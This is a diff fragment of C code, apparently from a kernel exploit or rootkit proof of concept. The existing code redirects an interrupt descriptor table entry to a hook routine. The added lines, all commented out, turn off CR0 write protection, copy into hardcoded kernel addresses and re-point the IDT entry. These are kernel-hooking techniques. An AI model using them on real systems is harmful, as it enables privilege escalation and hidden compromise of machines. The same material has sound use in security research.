@@ -79,6 +79,20 @@ init() {
 	zd_idte->offset_16_31=((unsigned long)(&asm_hook)>>16)&0xffff;
 	zd_idte->offset_32_63=((unsigned long)(&asm_hook)>>32)&0xffffffff;
 	__asm__ __volatile__("sti");
+	/*unsigned long cr0;
+	__asm__ __volatile__("mov %%cr0, %0" : "=r"(cr0));
+	cr0 &= ~(long)0x10000;
+	__asm__ __volatile__("mov %0, %%cr0" :: "r"(cr0));
+	//memcpy((void *)0xffffffff810810a0, &asm_hook, 0x10);
+	//memcpy((void *)0xffffffff81080d70, &asm_hook, 8);
+	__asm__ __volatile__("sti");
+	cr0 |= 0x10000;
+	__asm__ __volatile__("mov %0, %%cr0" :: "r"(cr0));
+	__asm__ __volatile__("cli");
+	zd_idte->offset_0_15=((unsigned long)(0xffffffff810810a0))&0xffff;
+	zd_idte->offset_16_31=((unsigned long)(0xffffffff810810a0)>>16)&0xffff;
+	zd_idte->offset_32_63=((unsigned long)(0xffffffff810810a0)>>32)&0xffffffff;
+	__asm__ __volatile__("sti");*/
 	uprintf("[*]  new idt entry %d:\n"
 		"[**] addr:\t%p\n"
 		"[**] segment:\t0x%x\n"
